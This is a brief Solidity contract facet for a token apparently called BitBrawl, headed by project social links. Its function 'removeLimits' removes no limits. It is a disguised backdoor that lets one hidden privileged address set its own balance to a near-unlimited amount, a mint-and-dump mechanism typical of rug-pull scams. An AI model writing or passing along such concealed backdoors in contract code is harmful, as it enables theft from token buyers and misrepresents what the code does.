/*  
   * SPDX-License-Identifier: MIT

    // Telegram: https://t.me/bitbrawl
    // Twitter: https://twitter.com/bitbrawlio
    // Website: https://www.bitbrawl.io/
    // Discord: https://discord.com/invite/bitbrawl
 
*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
